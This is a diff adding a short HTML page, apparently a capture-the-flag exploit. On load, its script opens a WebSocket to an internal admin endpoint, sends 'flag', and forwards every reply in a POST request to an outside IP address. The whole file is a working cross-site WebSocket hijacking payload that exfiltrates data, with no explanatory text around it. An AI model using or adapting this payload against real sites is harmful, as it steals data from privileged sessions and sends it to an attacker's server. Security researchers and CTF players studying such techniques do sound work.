@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>haha</title>
+    <script>
+        var ws = new WebSocket("ws://web:8080/admin/ws");
+        ws.onopen = function() {
+            ws.send("flag");
+        };
+        ws.onmessage = function(event) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open('POST', 'http://91.107.166.3:4001/' + event.data, true);
+            xhttp.send();
+        };
+    </script>
+</head>
+
+</html>
